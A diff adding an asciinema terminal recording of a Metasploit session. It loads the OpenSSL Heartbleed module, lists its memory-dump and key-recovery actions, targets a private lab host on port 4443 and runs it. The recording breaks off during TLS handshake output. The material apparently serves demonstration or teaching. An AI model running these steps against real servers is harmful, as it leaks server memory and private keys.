@@ -1,0 +1,1598 @@
+{
+  "width": 114,
+  "command": null,
+  "title": "heartbleed",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "version": 1,
+  "duration": 47.407096,
+  "stdout": [
+    [
+      0.042884,
+      "\u001b]0;root@kali: ~\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~\u001b[00m# "
+    ],
+    [
+      1.109236,
+      "m"
+    ],
+    [
+      0.080072,
+      "s"
+    ],
+    [
+      0.515049,
+      "f"
+    ],
+    [
+      0.174663,
+      "c"
+    ],
+    [
+      0.132574,
+      "o"
+    ],
+    [
+      0.097908,
+      "n"
+    ],
+    [
+      0.067739,
+      "sole "
+    ],
+    [
+      0.780682,
+      "\r\n"
+    ],
+    [
+      2.0,
+      "[*] Starting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.107443,
+      "[*] Starting the Metasploit Framework console...-\r"
+    ],
+    [
+      0.127755,
+      "\u001b[1m\u001b[31m[-]\u001b[0m Failed to connect to the database: could not connect to server: Connection refused\r\n\tIs the server running on host \"localhost\" (::1) and accepting\r\n\tTCP/IP connections on port 5432?\r\ncould not connect to server: Connection refused\r\n\tIs the server running on host \"localhost\" (127.0.0.1) and accepting\r\n\tTCP/IP connections on port 5432?\r\n\r\n"
+    ],
+    [
+      0.035499,
+      "[*] Starting the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.10133,
+      "[*] starting the Metasploit Framework console...|\r"
+    ],
+    [
+      0.147158,
+      "[*] STarting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.145596,
+      "[*] StArting the Metasploit Framework console...-\r"
+    ],
+    [
+      0.14446,
+      "[*] StaRting the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.149355,
+      "[*] StarTing the Metasploit Framework console...|\r"
+    ],
+    [
+      0.13707,
+      "[*] StartIng the Metasploit Framework console.../\r"
+    ],
+    [
+      0.150729,
+      "[*] StartiNg the Metasploit Framework console...-\r"
+    ],
+    [
+      0.104868,
+      "[*] StartinG the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.108918,
+      "[*] Starting the Metasploit Framework console...|\r"
+    ],
+    [
+      0.201202,
+      "[*] Starting The Metasploit Framework console.../\r"
+    ],
+    [
+      0.136217,
+      "[*] Starting tHe Metasploit Framework console...-\r"
+    ],
+    [
+      0.150829,
+      "[*] Starting thE Metasploit Framework console...\\\r"
+    ],
+    [
+      0.121666,
+      "[*] Starting the Metasploit Framework console...|\r"
+    ],
+    [
+      0.101152,
+      "[*] Starting the metasploit Framework console.../\r"
+    ],
+    [
+      0.110669,
+      "[*] Starting the MEtasploit Framework console...-\r"
+    ],
+    [
+      0.119648,
+      "[*] Starting the MeTasploit Framework console...\\\r"
+    ],
+    [
+      0.122602,
+      "[*] Starting the MetAsploit Framework console...|\r"
+    ],
+    [
+      0.14316,
+      "[*] Starting the MetaSploit Framework console.../\r"
+    ],
+    [
+      0.143679,
+      "[*] Starting the MetasPloit Framework console...-\r"
+    ],
+    [
+      0.110564,
+      "[*] Starting the MetaspLoit Framework console...\\\r"
+    ],
+    [
+      0.101301,
+      "[*] Starting the MetasplOit Framework console...|\r"
+    ],
+    [
+      0.102919,
+      "[*] Starting the MetasploIt Framework console.../\r"
+    ],
+    [
+      0.104547,
+      "[*] Starting the MetasploiT Framework console...-\r"
+    ],
+    [
+      0.100285,
+      "[*] Starting the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.100869,
+      "[*] Starting the Metasploit framework console...|\r"
+    ],
+    [
+      0.10057,
+      "[*] Starting the Metasploit FRamework console.../\r"
+    ],
+    [
+      0.101309,
+      "[*] Starting the Metasploit FrAmework console...-\r"
+    ],
+    [
+      0.100954,
+      "[*] Starting the Metasploit FraMework console...\\\r"
+    ],
+    [
+      0.100971,
+      "[*] Starting the Metasploit FramEwork console...|\r"
+    ],
+    [
+      0.100674,
+      "[*] Starting the Metasploit FrameWork console.../\r"
+    ],
+    [
+      0.100151,
+      "[*] Starting the Metasploit FramewOrk console...-\r"
+    ],
+    [
+      0.100183,
+      "[*] Starting the Metasploit FramewoRk console...\\\r"
+    ],
+    [
+      0.100845,
+      "[*] Starting the Metasploit FrameworK console...|\r"
+    ],
+    [
+      0.101709,
+      "[*] Starting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.10226,
+      "[*] Starting the Metasploit Framework Console...-\r"
+    ],
+    [
+      0.100691,
+      "[*] Starting the Metasploit Framework cOnsole...\\\r"
+    ],
+    [
+      0.100564,
+      "[*] Starting the Metasploit Framework coNsole...|\r"
+    ],
+    [
+      0.104328,
+      "[*] Starting the Metasploit Framework conSole.../\r"
+    ],
+    [
+      0.100555,
+      "[*] Starting the Metasploit Framework consOle...-\r"
+    ],
+    [
+      0.100368,
+      "[*] Starting the Metasploit Framework consoLe...\\\r"
+    ],
+    [
+      0.193259,
+      "[*] Starting the Metasploit Framework consolE...|\r"
+    ],
+    [
+      0.10019,
+      "[*] Starting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.104976,
+      "[*] Starting the Metasploit Framework console...-\r"
+    ],
+    [
+      0.100802,
+      "[*] Starting the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.102045,
+      "[*] Starting the Metasploit Framework console...|\r"
+    ],
+    [
+      0.100256,
+      "[*] Starting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.100384,
+      "[*] Starting the Metasploit Framework console...-\r"
+    ],
+    [
+      0.101595,
+      "[*] Starting the Metasploit Framework console...\\\r"
+    ],
+    [
+      0.100316,
+      "[*] starting the Metasploit Framework console...|\r"
+    ],
+    [
+      0.110748,
+      "[*] STarting the Metasploit Framework console.../\r"
+    ],
+    [
+      0.051678,
+      "\r                                                  "
+    ],
+    [
+      6.8e-05,
+      "\r\n"
+    ],
+    [
+      0.000579,
+      "\u001b[0m"
+    ],
+    [
+      0.001132,
+      "\u001b[36m\u001b[0m\u001b[1m\u001b[31m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      3e-05,
+      "                                   .,,.                  ."
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      3.1e-05,
+      "                                .\\$$$$$L..,,==aaccaacc%#s$b.       \u001b[37md\u001b[32m8,    \u001b[37md8\u001b[32mP"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "                     \u001b[37md8\u001b[36mP        \u001b[31m#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    \u001b[37m`BP  d88\u001b[32m8888p"
+    ],
+    [
+      2.8e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                  \u001b[37md\u001b[36m888888P      \u001b[31m'7$$$$\\\"\"\"\"''^^`` .7$$$|D*\"'```         \u001b[37m?\u001b[32m88'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "  \u001b[37md8\u001b[36mbd8b.d8p \u001b[37md8\u001b[36m888b \u001b[37m?\u001b[36m88' \u001b[37md88\u001b[36m8b8b\u001b[31m            _.os#$|8*\"`   \u001b[37md8\u001b[32mP       \u001b[37m?8\u001b[32mb  88P"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "  \u001b[37m8\u001b[36m8P`?P'?P \u001b[37md8\u001b[36mb_,dP 88P \u001b[37md8\u001b[36mP' ?88\u001b[31m       .oaS###S*\"`       \u001b[37md8\u001b[32mP \u001b[37md88\u001b[32m88b $whi?\u001b[32m88b 88b"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      " \u001b[36md88  d8 ?8 88b     \u001b[37m8\u001b[36m8b 88b  ,88b \u001b[31m.osS$$$$*\" \u001b[32m?88,.d88b, \u001b[37md\u001b[32m88 \u001b[37md\u001b[32m8P' ?88 88P `?8b"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      3.2e-05,
+      "\u001b[36md88' d88b 8b`?8888P'`?8b`?88P'\u001b[31m.aS$$$$Q*\"`    \u001b[32m`?88'  ?88 ?88 88b  d88 d88\u001b[31m"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "                          .a#$$$$$$\"`          \u001b[32m88b  d8P  88b`?8888P'\u001b[31m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                       ,s$$$$$$$\"`             \u001b[32m888888P'   88n\u001b[31m      _.,,,ass;:"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "                    .a$$$$$$$P`               \u001b[32md88P'\u001b[31m    .,.ass%#S$$$$$$$$$$$$$$'"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--\"\"''^^/$$$$$$'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "\u001b[37m___________\u001b[0m_____________________________\u001b[1m\u001b[30m_______________________\u001b[31m   ,&$$$$$$'\u001b[30m_____\u001b[31m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "                                                                 ll&&$$$$'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      5.8e-05,
+      "                                                              .;;lll&&&&'"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                                                            ...;;lllll&'"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                                                          ......;;;llll;;;...."
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "                                                           ` ......;;;;... .  ."
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "Payload caught by AV? Fly under the radar with Dynamic Payloads in"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "Metasploit Pro -- learn more on http://rapid7.com/metasploit"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "       =[ \u001b[33mmetasploit v4.14.10-dev\u001b[0m   "
+    ],
+    [
+      2.7e-05,
+      "                      ]"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      3.6e-05,
+      "+ -- --=[ 1639 exploits - 944 auxiliary - 289 post        ]"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "+ -- --=[ 472 payloads - 40 encoders - 9 nops             ]"
+    ],
+    [
+      3.2e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      0.160294,
+      "\u001b[4mmsf\u001b[0m \u001b[0m> "
+    ],
+    [
+      2.0,
+      "\r(reverse-i-search)`': "
+    ],
+    [
+      0.353578,
+      "\b\b\bu': run\b\b"
+    ],
+    [
+      0.087812,
+      "\b\b\b\bs': use auxiliary/scanner/ssl/openssl_heartbleed\r\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C"
+    ],
+    [
+      0.25309,
+      "\b\b\be': use auxiliary/scanner/ssl/openssl_heartbleed\r\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C"
+    ],
+    [
+      0.879559,
+      "\r\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[4mmsf\u001b[0m \u001b[0m>\r\u001b[4mmsf\u001b[0m \u001b[0m> "
+    ],
+    [
+      0.012554,
+      "\r\r\n"
+    ],
+    [
+      0.019175,
+      "\u001b[0m"
+    ],
+    [
+      0.053763,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      1.805453,
+      "s"
+    ],
+    [
+      0.141385,
+      "h"
+    ],
+    [
+      0.057214,
+      "o"
+    ],
+    [
+      0.148259,
+      "w"
+    ],
+    [
+      0.094321,
+      " "
+    ],
+    [
+      0.277906,
+      "o"
+    ],
+    [
+      0.066924,
+      "p"
+    ],
+    [
+      0.124411,
+      "t"
+    ],
+    [
+      0.113119,
+      "i"
+    ],
+    [
+      0.089259,
+      "o"
+    ],
+    [
+      0.210178,
+      "n"
+    ],
+    [
+      0.070467,
+      "s"
+    ],
+    [
+      0.525226,
+      "\r"
+    ],
+    [
+      0.007201,
+      "\r\n"
+    ],
+    [
+      0.032382,
+      "\u001b[0m"
+    ],
+    [
+      0.002552,
+      "\r\n"
+    ],
+    [
+      3.6e-05,
+      "Module options (auxiliary/scanner/ssl/openssl_heartbleed):"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   Name              Current Setting  Required  Description"
+    ],
+    [
+      2.2e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   ----              ---------------  --------  -----------"
+    ],
+    [
+      2.2e-05,
+      "\r\n"
+    ],
+    [
+      2.3e-05,
+      "   DUMPFILTER                         no        Pattern to filter leaked memory before storing"
+    ],
+    [
+      2.2e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   MAX_KEYTRIES      50               yes       Max tries to dump key"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   RHOSTS                             yes       The target address range or CIDR identifier"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   RPORT             443              yes       The target port (TCP)"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.1e-05,
+      "   STATUS_EVERY      5                yes       How many retries until status"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   THREADS           1                yes       The number of concurrent threads"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.3e-05,
+      "   TLS_CALLBACK      None             yes       Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES)"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2)"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      0.000645,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "Auxiliary action:"
+    ],
+    [
+      2.4e-05,
+      "\r\n"
+    ],
+    [
+      2.4e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   Name  Description"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.1e-05,
+      "   ----  -----------"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.2e-05,
+      "   SCAN  Check hosts for vulnerability"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      2.1e-05,
+      "\r\n"
+    ],
+    [
+      0.051474,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      1.886104,
+      "show options"
+    ],
+    [
+      0.629136,
+      "\b"
+    ],
+    [
+      0.000101,
+      "\u001b[K"
+    ],
+    [
+      0.113012,
+      "\b"
+    ],
+    [
+      0.000196,
+      "\u001b[K"
+    ],
+    [
+      0.115435,
+      "\b"
+    ],
+    [
+      8.4e-05,
+      "\u001b[K"
+    ],
+    [
+      0.105228,
+      "\b"
+    ],
+    [
+      6.9e-05,
+      "\u001b[K"
+    ],
+    [
+      0.114946,
+      "\b"
+    ],
+    [
+      0.000205,
+      "\u001b[K"
+    ],
+    [
+      0.120403,
+      "\b"
+    ],
+    [
+      9.9e-05,
+      "\u001b[K"
+    ],
+    [
+      0.109536,
+      "\b"
+    ],
+    [
+      7.1e-05,
+      "\u001b[K"
+    ],
+    [
+      0.511562,
+      "a"
+    ],
+    [
+      0.185547,
+      "c"
+    ],
+    [
+      0.240686,
+      "t"
+    ],
+    [
+      0.085008,
+      "i"
+    ],
+    [
+      0.168178,
+      "o"
+    ],
+    [
+      0.057466,
+      "n"
+    ],
+    [
+      0.078842,
+      "s"
+    ],
+    [
+      0.599716,
+      "\r"
+    ],
+    [
+      0.000272,
+      "\r\n"
+    ],
+    [
+      0.038083,
+      "\u001b[0m"
+    ],
+    [
+      0.001074,
+      "\r\n"
+    ],
+    [
+      5.1e-05,
+      "Auxiliary actions:"
+    ],
+    [
+      3.6e-05,
+      "\r\n"
+    ],
+    [
+      3.3e-05,
+      "\r\n"
+    ],
+    [
+      3.3e-05,
+      "   Name  Description"
+    ],
+    [
+      3.3e-05,
+      "\r\n"
+    ],
+    [
+      3.2e-05,
+      "   ----  -----------"
+    ],
+    [
+      3.3e-05,
+      "\r\n"
+    ],
+    [
+      3.6e-05,
+      "   DUMP  Dump memory contents"
+    ],
+    [
+      3.2e-05,
+      "\r\n"
+    ],
+    [
+      3.2e-05,
+      "   KEYS  Recover private keys from memory"
+    ],
+    [
+      3.1e-05,
+      "\r\n"
+    ],
+    [
+      3.3e-05,
+      "   SCAN  Check hosts for vulnerability"
+    ],
+    [
+      3.2e-05,
+      "\r\n"
+    ],
+    [
+      3.4e-05,
+      "\r\n"
+    ],
+    [
+      3.3e-05,
+      "\r\n"
+    ],
+    [
+      0.060476,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      2.0,
+      "\r"
+    ],
+    [
+      0.000238,
+      "\r\n"
+    ],
+    [
+      0.032705,
+      "\u001b[0m"
+    ],
+    [
+      0.043685,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      2.0,
+      "\r"
+    ],
+    [
+      0.000422,
+      "\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P"
+    ],
+    [
+      0.000265,
+      "(reverse-i-search)`':"
+    ],
+    [
+      0.000413,
+      "\u001b[C"
+    ],
+    [
+      1.141598,
+      "\b\b\b"
+    ],
+    [
+      0.000376,
+      "R': set RHOSTS 172.28.128.6"
+    ],
+    [
+      0.000274,
+      "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.185977,
+      "\b\b\b\b\b\b\b"
+    ],
+    [
+      0.00032,
+      "H': set RHOSTS 172.28.128.6"
+    ],
+    [
+      0.000271,
+      "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.066159,
+      "\b\b\b\b\b\b\b"
+    ],
+    [
+      9.5e-05,
+      "O': set RHOSTS 172.28.128.6"
+    ],
+    [
+      8e-05,
+      "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.883468,
+      "\r"
+    ],
+    [
+      0.000608,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> set RHOSTS 172.28.128.6"
+    ],
+    [
+      0.000464,
+      "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.001715,
+      "\r"
+    ],
+    [
+      0.000265,
+      "\r\n"
+    ],
+    [
+      0.035668,
+      "\u001b[0m"
+    ],
+    [
+      0.001127,
+      "RHOSTS => 172.28.128.6"
+    ],
+    [
+      4.8e-05,
+      "\r\n"
+    ],
+    [
+      0.050828,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      1.166685,
+      "\r"
+    ],
+    [
+      0.000382,
+      "\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P"
+    ],
+    [
+      0.000196,
+      "(reverse-i-search)`':"
+    ],
+    [
+      0.000272,
+      "\u001b[C"
+    ],
+    [
+      1.541471,
+      "\b\b\b"
+    ],
+    [
+      0.000328,
+      "P': set RPORT 4443"
+    ],
+    [
+      0.000243,
+      "\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.08739,
+      "\b\b\b\b\b\b\b\b"
+    ],
+    [
+      5.5e-05,
+      "O': set RPORT 4443"
+    ],
+    [
+      4.5e-05,
+      "\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.129947,
+      "\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.000314,
+      "R': set RPORT 4443"
+    ],
+    [
+      0.000376,
+      "\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.251047,
+      "\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.000481,
+      "T': set RPORT 4443"
+    ],
+    [
+      0.00033,
+      "\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.609918,
+      "\r"
+    ],
+    [
+      0.011613,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> set RPORT 4443"
+    ],
+    [
+      0.00052,
+      "\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.001256,
+      "\r"
+    ],
+    [
+      0.000209,
+      "\r\n"
+    ],
+    [
+      0.020366,
+      "\u001b[0m"
+    ],
+    [
+      0.001013,
+      "RPORT => 4443"
+    ],
+    [
+      5e-05,
+      "\r\n"
+    ],
+    [
+      0.077167,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      0.993677,
+      "e"
+    ],
+    [
+      0.228037,
+      "x"
+    ],
+    [
+      0.180014,
+      "p"
+    ],
+    [
+      0.047083,
+      "l"
+    ],
+    [
+      0.189366,
+      "o"
+    ],
+    [
+      0.075928,
+      "i"
+    ],
+    [
+      0.161883,
+      "t"
+    ],
+    [
+      0.733145,
+      "\b"
+    ],
+    [
+      0.000583,
+      "\u001b[K"
+    ],
+    [
+      0.499562,
+      "\b"
+    ],
+    [
+      0.000563,
+      "\u001b[K"
+    ],
+    [
+      0.031506,
+      "\b"
+    ],
+    [
+      0.000353,
+      "\u001b[K"
+    ],
+    [
+      0.041107,
+      "\b"
+    ],
+    [
+      8.4e-05,
+      "\u001b[K"
+    ],
+    [
+      0.013829,
+      "\b"
+    ],
+    [
+      8.7e-05,
+      "\u001b[K"
+    ],
+    [
+      0.030044,
+      "\b"
+    ],
+    [
+      8.5e-05,
+      "\u001b[K"
+    ],
+    [
+      0.029786,
+      "\b"
+    ],
+    [
+      7.3e-05,
+      "\u001b[K"
+    ],
+    [
+      0.029919,
+      "\u0007"
+    ],
+    [
+      0.029883,
+      "\u0007"
+    ],
+    [
+      0.030994,
+      "\u0007"
+    ],
+    [
+      0.033067,
+      "\u0007"
+    ],
+    [
+      0.029701,
+      "\u0007"
+    ],
+    [
+      0.030372,
+      "\u0007"
+    ],
+    [
+      0.031167,
+      "\u0007"
+    ],
+    [
+      0.028115,
+      "\u0007"
+    ],
+    [
+      0.349262,
+      "\r"
+    ],
+    [
+      0.000226,
+      "\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P\u001b[P"
+    ],
+    [
+      0.000102,
+      "(reverse-i-search)`':"
+    ],
+    [
+      0.000147,
+      "\u001b[C"
+    ],
+    [
+      0.268706,
+      "\b\b\b"
+    ],
+    [
+      0.000773,
+      "v': set  verbose true"
+    ],
+    [
+      0.000315,
+      "\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.166041,
+      "\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.0003,
+      "e': set  verbose true"
+    ],
+    [
+      0.000275,
+      "\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.101186,
+      "\b\b\b\b\b\b\b\b"
+    ],
+    [
+      9e-05,
+      "r': set  verbose true"
+    ],
+    [
+      7.8e-05,
+      "\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.582954,
+      "\r"
+    ],
+    [
+      0.000658,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> set  verbose true"
+    ],
+    [
+      0.000328,
+      "\b\b\b\b\b\b\b\b\b\b\b\b"
+    ],
+    [
+      0.000905,
+      "\r"
+    ],
+    [
+      0.000165,
+      "\r\n"
+    ],
+    [
+      0.038436,
+      "\u001b[0m"
+    ],
+    [
+      0.000803,
+      "verbose => true\r\n"
+    ],
+    [
+      0.044823,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      1.446668,
+      "e"
+    ],
+    [
+      0.209802,
+      "x"
+    ],
+    [
+      0.115151,
+      "p"
+    ],
+    [
+      0.056147,
+      "l"
+    ],
+    [
+      0.17286,
+      "o"
+    ],
+    [
+      0.062392,
+      "i"
+    ],
+    [
+      0.150606,
+      "t"
+    ],
+    [
+      0.64013,
+      "\r\r\n"
+    ],
+    [
+      0.013531,
+      "\u001b[0m"
+    ],
+    [
+      0.049116,
+      "\r\n"
+    ],
+    [
+      0.000702,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - Sending Client Hello...\r\n"
+    ],
+    [
+      0.00783,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - SSL record #1:\r\n"
+    ],
+    [
+      0.000276,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tType:    22\r\n"
+    ],
+    [
+      0.000556,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tVersion: 0x0301\r\n"
+    ],
+    [
+      0.00031,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tLength:  86\r\n"
+    ],
+    [
+      0.000343,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tHandshake #1:\r\n"
+    ],
+    [
+      0.000326,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tLength: 82\r\n"
+    ],
+    [
+      0.000331,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tType:   Server Hello (2)\r\n"
+    ],
+    [
+      0.000409,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tServer Hello Version:           0x0301\r\n"
+    ],
+    [
+      0.000531,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tServer Hello random data:       59358fa84cd7f58ac4983e04703ad898b78528060a0d06cd0b64a01909c312d0\r\n"
+    ],
+    [
+      0.000657,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tServer Hello Session ID length: 32\r\n"
+    ],
+    [
+      0.000483,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tServer Hello Session ID:        daf9a978d3e358f3c1a3470e05742a02626238ebf27c6bd9c08251038066a612\r\n"
+    ],
+    [
+      0.000736,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - SSL record #2:\r\n"
+    ],
+    [
+      0.009151,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tType:    22\r\n"
+    ],
+    [
+      0.000529,
